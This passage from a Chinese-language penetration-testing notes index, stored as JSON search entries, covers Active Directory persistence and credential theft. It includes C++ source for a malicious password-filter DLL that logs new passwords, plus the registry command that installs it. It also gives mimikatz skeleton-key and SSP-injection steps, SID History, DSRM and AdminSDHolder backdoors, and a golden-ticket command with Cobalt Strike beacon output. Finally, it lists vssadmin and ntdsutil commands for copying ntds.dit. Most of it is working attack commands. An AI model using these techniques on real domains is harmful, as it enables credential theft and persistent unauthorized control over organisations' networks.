\u901a\u5e38\u6765\u8bf4\uff0c\u8fd9\u4e2adll\u6587\u4ef6\u7684\u5728\u6ce8\u518c\u8868\u4e2d\u7684\u8def\u5f84\u662f hklm\\system\\currentcontrolset\\control\\lsa\u7684 notification packages\u8868\u9879\u3002 \u6211\u4eec\u8981\u5229\u7528\u8be5\u65b9\u6cd5\uff0c\u9996\u5148\u8981\u786e\u4fdd\u5bc6\u7801\u7b56\u7565\u5df2\u542f\u7528 \u81f3\u4e8e\u547d\u4ee4\u884c\u600e\u4e48\u4fee\u6539\u3002\u53ef\u4ee5\u8fd9\u6837 secedit /export /cfg gp.inf /quiet \u5c06\u7ec4\u7b56\u7565\u5bfc\u51fa\u4e3a\u6587\u4ef6 \u5728\u8be5\u6587\u4ef6\u91cc\u5c06PasswordComplexity\u9879\u503c\u4fee\u6539\u4e3a1 \u7136\u540e\u7528secedit /configure /db gp.sdb /cfg gp.inf /quiet \u5c06\u5176\u5bfc\u5165\u6570\u636e\u5e93 \u5237\u65b0\u7ec4\u7b56\u7565\uff1a gpupdate/force \u91cd\u542f\u540e\u751f\u6548 \u4e0b\u9762\u6211\u4eec\u6784\u9020dll\u6587\u4ef6\u53bb\u8986\u76d6\u5b83\u3002 \u9996\u5148\u6211\u4eec\u7684dll\u6587\u4ef6\u5185\u5bb9\u5982\u4e0b\u3002 #include<Windows.h> #include<NTSecAPI.h> #include <fstream> extern \"C\" __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify() { OutputDebugString(L\"InitializeChangeNotify\"); return TRUE; } extern \"C\" __declspec(dllexport) BOOLEAN __stdcall PasswordFilter( PUNICODE_STRING AccountName, PUNICODE_STRING FullName, PUNICODE_STRING Password, BOOLEAN SetOperation) { OutputDebugString(L\"PasswordFilter\"); return TRUE; } extern \"C\" __declspec(dllexport) BOOLEAN __stdcall PasswordChangeNotify( PUNICODE_STRING UserName, ULONG RelativeId, PUNICODE_STRING NewPassword) { FILE *pFile; fopen_s(&pFile, \"C:\\\\logFile.txt\", \"a+\"); fprintf(pFile, \"%ws:%ws\", UserName->Buffer, NewPassword->Buffer); return 0; } \u7136\u540e\u628a\u8fd9\u4e2adll\u6587\u4ef6\u653e\u5165system32\u6587\u4ef6\uff0c\u7136\u540e\u4fee\u6539\u6ce8\u518c\u8868\uff0c\u4f7f hklm\\system\\currentcontrolset\\control\\lsa\u7684 notification packages\u8868\u9879\u5305\u62ec\u6211\u4eec\u7684\u6076\u610fdll\u6587\u4ef6\uff0c\u5177\u4f53\u547d\u4ee4\u884c\u64cd\u4f5c\u5982\u4e0b REG ADD \"HKLMSYSTEMCurrentControlSetControlLsa\" /v \"Notification Packages\" /t REG_MULTI_SZ /d \"evildll\" /f \u91cd\u542f\u540e\u751f\u6548\u3002\u65e0\u5948\u7684\u662f\u6211\u628adll\u6587\u4ef6\u5199\u51fa\u6765\u4e86\u4e14\u786e\u4fdd\u662f\u6b63\u786e\u7684\uff0c\u5728win7\u548cwin2012\u4e0a\u590d\u73b0\u5747\u5931\u8d25\uff0c\u7f51\u4e0a\u6210\u529f\u7684\u4f8b\u5b50\u662fwin2008server\uff0c\u53ef\u60dc\u6211\u5e76\u6ca1\u6709\u8fd9\u4e2a\u7248\u672c\u7684\u865a\u62df\u673a\u4e0d\u8fc7\u539f\u7406\u5012\u662f\u61c2\u4e86","title":"Hook PasswordChangeNotify"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_3","text":"\u8fd0\u7528mimkatz\u53ef\u4ee5\u5728\u57df\u63a7\u673a\u4e0a\u5bf9\u6240\u6709\u7528\u6237\u6dfb\u52a0\u4e00\u4e2a\u7edf\u4e00\u5bc6\u7801\u7528\u6765\u767b\u5f55. mimikatz# privilege::debug mimikatz# misc::skeleton \u7136\u540e\u6240\u6709\u7528\u6237\u90fd\u80fd\u7528\u5bc6\u7801 mimiaktz\u767b\u9646\u4e86","title":"\u4e07\u80fd\u5bc6\u7801"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#ssp","text":"ssp:\u4e00\u4e2aDLL\u6587\u4ef6\uff0c\u7528\u6765\u5b9e\u73b0Windows\u8eab\u4efd\u9a8c\u8bc1\u529f\u80fd\uff0c\u6bd4\u5982kerberos\uff0cntlm\u3002\u7cfb\u7edf\u542f\u52a8\u65f6SSP\u4f1a\u88ab\u81ea\u52a8\u52a0\u8f7d\u5165lsass.exe sspi:SSP\u7684API\u63a5\u53e3 \u5982\u679c\u6211\u4eec\u81ea\u5b9a\u4e49\u4e2a\u6076\u610fdll\u6587\u4ef6\u8ba9\u4ed6\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u81ea\u52a8\u52a0\u8f7d\u5230lsass.exe,\u5c31\u80fd\u5f97\u5230\u8fdb\u7a0b\u4e2d\u7684\u660e\u6587\u5bc6\u7801 \u4e34\u65f6\u6027\u6ce8\u5165(\u91cd\u542f\u4fbf\u5931\u6548) mimikatz# privilege::debug mimiaktz# misc::memssp \u6267\u884c\u5982\u4e0a\u547d\u4ee4, \u7136\u540e\u53ea\u8981\u76ee\u6807\u673a\u5668\u4e0d\u91cd\u542f\uff0c\u5728\u76ee\u6807\u673a\u5668\u4e0a\u767b\u5f55\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\u5c06\u4f1a\u88ab\u8bb0\u5f55\u5728 C:\\Windows\\System32\\mimilsa.log \u6587\u4ef6\u4e2d\u3002 \u957f\u671f\u6027\u6ce8\u5165\uff08\u91cd\u542f\u4e0d\u5931\u6548\uff09 \u628a mimikatz\u4e2d\u7684mimilib.dll\u653e\u5230\u7cfb\u7edf\u7684C:\\Windows\\System32\\ \u76ee\u5f55\u4e0b\uff0c\u5e76\u5c06 mimilib.dll \u6dfb\u52a0\u5230\u6ce8\u518c\u8868\u4e2d\uff0c\u4f7f\u7528\u8fd9\u79cd\u65b9\u6cd5\uff0c\u5373\u4f7f\u7cfb\u7edf\u91cd\u542f\uff0c\u4e5f\u4e0d\u4f1a\u5f71\u54cd\u6301\u4e45\u5316\u6548\u679c\u3002 \u4fee\u6539\u6ce8\u518c\u8868 HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/Lsa \u7684 Security Packages \u9879\uff0c\u52a0\u8f7d\u65b0\u7684DLL\u6587\u4ef6 \u7528\u6237\u5728\u767b\u5f55\u65f6\u8f93\u5165\u7684\u8d26\u53f7\u5bc6\u7801\u5c06\u4f1a\u88ab\u8bb0\u5f55\u5728 C:\\Windows\\System32\\kiwissp.log","title":"SSP\u6ce8\u5165"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#sid-history","text":"sid history:\u5f53\u6211\u4eec\u628a\u57dfA\u7684\u7528\u6237x\u8fc1\u79fb\u5230\u57dfB\u65f6\uff0cB\u57df\u4e2dx\u7684sid\u4f1a\u53d1\u751f\u6539\u53d8\uff0c\u968f\u5373\u800c\u6765\u7684\u662f\u6743\u9650\u4e5f\u4f1a\u53d1\u751f\u6539\u53d8\u3002\u6240\u4ee5\u4e3a\u4e86\u907f\u514d\u8fd9\u79cd\u6743\u9650\u6539\u53d8\uff0csid history\u8bde\u751f\u4e86\uff0c \u7cfb\u7edf\u4f1a\u5c06\u5176\u539f\u6765\u7684SID\u6dfb\u52a0\u5230\u8fc1\u79fb\u540e\u7528\u6237\u7684SID History\u5c5e\u6027\u4e2d\uff0c\u4f7f\u8fc1\u79fb\u540e\u7684\u7528\u6237\u4fdd\u6301\u539f\u6709\u6743\u9650\u3001\u80fd\u591f\u8bbf\u95ee\u5176\u539f\u6765\u53ef\u4ee5\u8bbf\u95ee\u7684\u8d44\u6e90 \u3002 \u5728\u57df\u63a7\u4e0a privilege::debug sid::patch sid::add /sam:const27 /new:administrator \u5c06administrator\u7684SID\u6dfb\u52a0\u5230const27\u7684sid history\u5c5e\u6027 \u7136\u540e\u53ef\u4ee5\u5728\u57df\u63a7\u4e0a\u9a8c\u8bc1\u5176sid history\u662f\u5426\u66f4\u6539\u6210\u529f Import-Module activedirectory Get-ADUser const27 -Properties sidhistory \u53ef\u4ee5\u53d1\u73b0\u73b0\u5728\u662f\u6709SIDHistory\u5c5e\u6027\u4e86\u3002\u800c\u4e14\u672b\u5c3e\u7684500\u9884\u793a\u7740ADMIN\u6743\u9650","title":"SID History\u540e\u95e8"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#dsrm","text":"DSRM\u8d26\u53f7:\u6bcf\u4e2a\u57df\u63a7\u4e0a\u90fd\u6709\u4e00\u4e2a\u672c\u5730\u7ba1\u7406\u5458\u8d26\u6237\u4e5f\u5c31\u662fDSRM\u8d26\u6237\uff0c\u7528\u4e8e\u5728\u57df\u73af\u5883\u51fa\u73b0\u6545\u969c\u65f6\u672c\u5730\u767b\u5f55\u8fdb\u884c\u4fee\u590d.\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u8d26\u6237\u8fdb\u884c\u6301\u4e45\u5316\u64cd\u4f5c\u3002\uff08 \u5982\u679c\u57df\u63a7\u5236\u5668\u7684\u7cfb\u7edf\u7248\u672c\u4e3aWindows Server 2003\uff0c\u5219\u4e0d\u80fd\u4f7f\u7528\u8be5\u65b9\u6cd5\u8fdb\u884c\u6301\u4e45\u5316\u64cd\u4f5c\u3002 \uff09 \u6211\u4eec\u5148\u8bbe\u7f6eDSRM\u5bc6\u7801 \u57df\u63a7\u4e0a\u8f93\u5165ntdsutil \u7136\u540e\u8f93\u5165reset password on server null \u7136\u540e\u952e\u5165\u5bc6\u7801\uff0c\u6700\u540e\u6309q\u9000\u51fa\u5373\u53ef \u5728mimikatz\u4e2ddump\u672c\u5730hash\u53ef\u4ee5\u770b\u5230\u591a\u51fa\u6765\u4e2aAdministrator \u7136\u540e\u8bbe\u7f6eDSRM\u767b\u9646\u65b9\u5f0f DSRM\u767b\u9646\u65b9\u5f0f\u6709\u4e09\u79cd\u5206\u522b\u5bf9\u5e94123. 0\uff1a\u9ed8\u8ba4\u503c\uff0c\u53ea\u6709\u5f53\u57df\u63a7\u5236\u5668\u91cd\u542f\u5e76\u8fdb\u5165DSRM\u6a21\u5f0f\u65f6\uff0c\u624d\u53ef\u4ee5\u4f7f\u7528DSRM\u7ba1\u7406\u5458\u8d26\u53f7 1\uff1a\u53ea\u6709\u5f53\u672c\u5730AD\u3001DS\u670d\u52a1\u505c\u6b62\u65f6\uff0c\u624d\u53ef\u4ee5\u4f7f\u7528DSRM\u7ba1\u7406\u5458\u8d26\u53f7\u767b\u5f55\u57df\u63a7\u5236\u5668 2\uff1a\u5728\u4efb\u4f55\u60c5\u51b5\u4e0b\uff0c\u90fd\u53ef\u4ee5\u4f7f\u7528DSRM\u7ba1\u7406\u5458\u8d26\u53f7\u767b\u5f55\u57df\u63a7\u5236\u5668 \u6211\u4eec\u9700\u8981\u5c06\u4ed6\u6539\u62102\u624d\u884c\u3002powershell\u6267\u884c New-ItemProperty \"hklm:\\system\\currentcontrolset\\control\\lsa\\\" -name \"dsrmadminlogonbehavior\" -value 2 -propertyType DWORD \u5373\u53ef.\u7136\u540e\u76f4\u63a5psexec\u767b\u5f55(\u8fd9\u91cc\u7528\u7684\u662fcs) \u6ce8\u610f\u586bRealm\u65f6\u8981\u586b\u4e0a\u9762dump\u51fasam\u65f6\u7684\u57df\u540d\uff08\u8fd9\u91cc\u662fDC\uff09","title":"DSRM\u540e\u95e8"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_4","text":"\u8fd9\u4e2a\u5f88\u7b80\u5355\uff0c\u5229\u7528\u7ea6\u675f\u6027\u59d4\u6d3e\u6216\u8005\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb\u5f97\u5230\u7684ST2\u4fdd\u5b58\u8d77\u6765\uff0c\u6216\u8005\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u5f97\u5230\u7684TGT\uff0c\u8981\u7528\u7684\u65f6\u5019\u52a0\u8f7d\u8fdb\u5185\u5b58\u5c31\u884c\u4e86","title":"\u59d4\u6d3e\u540e\u95e8"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_5","text":"#\u63d0\u6743 privilege::debug #\u751f\u6210\u9ec4\u91d1\u7968\u636e\u5e76\u5bfc\u5165 kerberos::golden /user:administrator /domain:const.com /sid:\u5f53\u524d\u7528\u6237sid\u53bb\u6389\u6700\u540e\u4e00\u4e2a\u6570\u636e /krbtgt:krbtgt\u7684hash /ptt cs beacon> mimikatz kerberos::golden /user:Administrator /domain:ocean.com /sid:S-1-5-21-436250240-237335239-2342608000 /krbtgt:31d6cfe0d16ae931b73c59d7e0c089c0 /endin:480 /renewmax:10080 /ptt [*] Tasked beacon to run mimikatz's kerberos::golden /user:Administrator /domain:ocean.com /sid:S-1-5-21-436250240-237335239-2342608000 /krbtgt:31d6cfe0d16ae931b73c59d7e0c089c0 /endin:480 /renewmax:10080 /ptt command [+] host called home, sent: 438858 bytes [+] received output: User : Administrator Domain : ocean.com (OCEAN) SID : S-1-5-21-436250240-237335239-2342608000 User Id : 500 Groups Id : *513 512 520 518 519 ServiceKey: 31d6cfe0d16ae931b73c59d7e0c089c0 - rc4_hmac_nt Lifetime : 2021/12/6 15:46:14 ; 2021/12/6 23:46:14 ; 2021/12/13 15:46:14 -> Ticket : ** Pass The Ticket ** * PAC generated * PAC signed * EncTicketPart generated * EncTicketPart encrypted * KrbCred generated Golden ticket for 'Administrator @ ocean.com' successfully submitted for current session","title":"\u9ec4\u91d1\u7968\u636e\u751f\u6210"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#adminsdholder","text":"AdminSDHolder\u662f\u4e00\u4e2a\u7279\u6b8a\u5bb9\u5668\uff0c\u7528\u4f5c\u53d7\u4fdd\u62a4\u7528\u6237\u6216\u7ec4\u7684ACM\u6a21\u677f\u3002AD\u5b9a\u671f\u628a AdminSDHolder\u5bf9\u8c61\u7684ACL \u5e94\u7528\u5230\u6240\u6709\u53d7\u4fdd\u62a4\u7528\u6237\u6216\u7ec4\u4e0a\uff0c\u9632\u6b62\u5176\u88ab\u6709\u610f\u6216\u6545\u610f\u4fee\u6539\u3002 \u5982\u679c\u80fd\u591f\u4fee\u6539AdminSDHolder\u5bf9\u8c61\u7684ACL\uff0c\u90a3\u4e48\u4fee\u6539\u7684\u6743\u9650\u5c06\u81ea\u52a8\u5e94\u7528\u4e8e\u6240\u6709\u53d7\u4fdd\u62a4\u7684AD\u8d26\u6237\u548c\u7ec4\uff0c\u8fd9\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a\u57df\u73af\u5883\u6743\u9650\u7ef4\u6301\u7684\u65b9\u6cd5 \u3002 \u5982\u4f55\u5bfb\u627e\u53d7\u4fdd\u62a4\u7528\u6237\u6216\u7ec4\uff1a \u53d7\u4fdd\u62a4\u7528\u6237\u6216\u7ec4\u7684 AdminCount\u5c5e\u6027\u4e3a1 \u3002 \u4f46\u662f\uff0c\u5982\u679c\u5bf9\u8c61\u5df2\u79fb\u51fa\u53d7\u4fdd\u62a4\u7ec4\uff0c\u5176AdminCount\u5c5e\u6027\u4ecd\u4e3a1\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6709\u53ef\u80fd\u83b7\u5f97\u66fe\u7ecf\u662f\u53d7\u4fdd\u62a4\u7ec4\u7684\u5e10\u6237\u548c\u7ec4 \u3002 \u4f7f\u7528powerview.ps1 Get-NetUser -AdminCount \u5373\u53ef\u83b7\u5f97\u53d7\u4fdd\u62a4\u7528\u6237 Get-NetGroup -AdminCount \u5373\u53ef\u83b7\u5f97\u53d7\u4fdd\u62a4\u7ec4 \u5982\u4f55\u4fee\u6539ADMINSDHOLDER\u7684ACL \u57df\u7ba1\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4(powerview.ps1) Add-DomainObjectAcl -TargetSearchBase \"LDAP://CN=AdminSDHolder,CN=System,DC=CONST,DC=COM\" -PrincipalIdentity xx -Verbose -Rights ALL \u7ed9AdminSDHoloder\u6dfb\u52a0\u4e00\u6761ACL,\u8ba9xx\u7528\u6237\u83b7\u5f97\u5b8c\u5168\u63a7\u5236\u6743 \u7136\u540e\u9ed8\u8ba4\u7b4960\u5206\u949f\uff0c\u5f85ADMINSDHOLDER\u751f\u6548\u540e\uff0cxx\u5c31\u83b7\u5f97\u6240\u6709\u53d7\u4fdd\u62a4\u5bf9\u8c61\u7684\u5b8c\u5168\u63a7\u5236\u6743\u4e86","title":"AdminSDHolder"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#ntdsdit","text":"\"Ntds.dit\u6587\u4ef6\u662f\u57df\u73af\u5883\u4e2d\u57df\u63a7\u4e0a\u4f1a\u6709\u7684\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u662f\u4e3b\u8981\u7684\u6d3b\u52a8\u76ee\u5f55\u6570\u636e\u5e93\uff0c\u5176\u6587\u4ef6\u8def\u5f84\u4e3a\u57df\u63a7\u7684 %SystemRoot%\\ntds\\ntds.dit\uff0c\u6d3b\u52a8\u76ee\u5f55\u59cb\u7ec8\u4f1a\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\uff0c\u6240\u4ee5\u6587\u4ef6\u7981\u6b62\u88ab\u8bfb\u53d6\u3002Ntds.dit\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u6709\u5173\u57df\u7528\u6237\u3001\u7ec4\u548c\u7ec4\u6210\u5458\u8eab\u4efd\u548c\u51ed\u636e\u4fe1\u606f\u3001GPP\u7b49\u4fe1\u606f\u3002\u5b83\u5305\u62ec\u57df\u4e2d\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u503c\uff0c\u4e3a\u4e86\u8fdb\u4e00\u6b65\u4fdd\u62a4\u5bc6\u7801\u54c8\u5e0c\u503c\uff0c\u4f7f\u7528\u5b58\u50a8\u5728SYSTEM\u6ce8\u518c\u8868\u914d\u7f6e\u5355\u5143\u4e2d\u7684\u5bc6\u94a5\u5bf9\u8fd9\u4e9b\u54c8\u5e0c\u503c\u8fdb\u884c\u52a0\u5bc6\u3002\"\u2014\u2014FREEBUF.whoami\u300a\u5185\u7f51\u6e17\u900f\u6d4b\u8bd5\uff1a\u4eceNTDS.dit\u83b7\u53d6\u57df\u6563\u5217\u503c\u300b \u63d2\u4e2a\u9898\u5916\u8bdd\uff1a\u975e\u57df\u7684\u5de5\u4f5c\u7ec4\u4e3b\u673a\u5176\u5bc6\u7801\u7b49\u4fe1\u606f\u5b58\u50a8\u5728SAM\u4e2d\u3002 \u6211\u4eec\u83b7\u53d6\u4e86\u57df\u63a7\u540e\u4e00\u822c\u7b2c\u4e00\u6b65\u4fbf\u662f\u5bfc\u51faNtds.dit\u4e2d\u7684\u4fe1\u606f,\u600e\u4e48\u5bfc\u51fa\u5462\uff1f","title":"Ntds.dit"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#vss","text":"VSS\u5168\u79f0\u4e3aVolume Shadow Copy Service\uff0c\u5377\u5f71\u62f7\u8d1d\u670d\u52a1\uff0c\u5c5e\u4e8e\u5feb\u7167\u6280\u672f\u7684\u4e00\u79cd\uff0c\u4e3b\u8981\u7528\u4e8e\u5907\u4efd\u548c\u6062\u590d\uff0c\u5373\u4f7f\u6587\u4ef6\u5904\u4e8e\u88ab\u9501\u5b9a\u72b6\u6001\u3002 \u5176\u83b7\u53d6NTDS.DIT\u7684\u57fa\u672c\u6b65\u9aa4\u4e3a\uff1a \u521b\u5efa\u76ee\u6807\u4e3b\u673a\u6240\u6709\u6587\u4ef6\u7684\u5377\u5f71\u62f7\u8d1d\u3002 \u5728\u521b\u5efa\u7684\u5377\u5f71\u62f7\u8d1d\u4e2d\u590d\u5236\u51faNTDS.DIT\u3002 \u5220\u9664\u5377\u5f71\u62f7\u8d1d\u3002","title":"\u5229\u7528VSS\u5bfc\u51fa"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#vssadmin","text":"vssadmin\u662fwindows\u4e0a\u4e00\u4e2a\u547d\u4ee4\u884c\u5377\u5f71\u62f7\u8d1d\u670d\u52a1\u7ba1\u7406\u5de5\u5177\u3002\u5176\u9002\u7528\u4e8e\uff1a Windows 10\uff0cWindows 8.1\uff0cWindows Server 2016\uff0cWindows Server 2012 R2\uff0cWindows Server 2012\uff0cWindows Server 2008 R2\uff0cWindows Server 2008 \u5176\u5bfc\u51faNTDS.DIT\u7684\u65b9\u6cd5\u5982\u4e0b \u521b\u5efa\u4e00\u4e2aC\u76d8\u7684\u5377\u5f71\u62f7\u8d1d vssadmin create shadow /for=c: \u7136\u540e\u5c06\u5377\u5f71\u4e2d\u7684ntds.dit\u590d\u5236\u51fa\u6765 copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\ntds\\ntds.dit C:\\ntds.dit \u7136\u540e\u5220\u9664\u5377\u5f71 vssadmin delete shadows /for=c: /quiet","title":"VSSADMIN"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#ntdsutilexe","text":"Ntdsutil.exe \u662f\u4e00\u4e2a\u4e3a Active Directory \u63d0\u4f9b\u7ba1\u7406\u8bbe\u65bd\u7684\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u8be5\u5de5\u5177\u88ab\u9ed8\u8ba4\u5b89\u88c5\u5728\u4e86\u57df\u63a7\u5236\u5668\u4e0a\uff0c\u53ef\u4ee5\u5728\u57df\u63a7\u4e0a\u76f4\u63a5\u64cd\u4f5c\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u57df\u5185\u673a\u5668\u5728\u57df\u63a7\u4e0a\u8fdc\u7a0b\u64cd\u4f5c\uff0c\u4f46\u662f\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\u3002 \u4e3aWINDOWS\u4e0a\u6240\u6709\u6587\u4ef6\u521b\u5efa\u5feb\u7167 ntdsutil snapshot \"activate instance ntds\" create quit quit \u6211\u4eec\u5f97\u5230\u4e86\u4e2a\u5feb\u7167\u7684ID\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u5c31\u9700\u8981\u52a0\u8f7d\u8fd9\u4e2a\u5377\u5f71\u5230\u6211\u4eec\u7684\u78c1\u76d8\u4e2d ntdsutil snapshot \"mount {bdccff3c-810c-4f78-9d80-c6729910e83a}\" quit quit \u6267\u884c\u540e\u5c31\u4f1a\u53d1\u73b0\u8fd9\u4e2a\u5feb\u7167\u52a0\u8f7d\u5230\u4e86C\u76d8\u4e0b\uff08\u8fd9\u91ccdir\u770b\u5230\u7684NTDS.DIT\u4e0e\u672c\u6b21\u5b9e\u9a8c\u65e0\u5173\uff0c\u662f\u4e0a\u6b21\u5b9e\u9a8c\u6b8b\u7559\u4e0b\u6765\u6ca1\u5220\u7684\uff09 \u7136\u540e\u5c06ntds.dit\u590d\u5236\u51fa\u6765 copy c:\\$SNAP_202107291703_VOLUMEC$\\Windows\\NTDS\\ntds.dit c:\\ntds.dit \u7136\u540e\u5220\u9664\u5feb\u7167 ntdsutil snapshot \"mount {bdccff3c-810c-4f78-9d80-c6729910e83a}\" \"delete {bdccff3c-810c-4f78-9d80-c6729910e83a}\" quit quit \u540c\u65f6\uff0cNTDSUTIL\u8fd8\u6709\u4e00\u4e2a\u66f4\u52a0\u4fbf\u6377\u7684\u5bfc\u51fantds.dit\u7684\u65b9\u6cd5\uff1a\u901a\u8fc7IFM 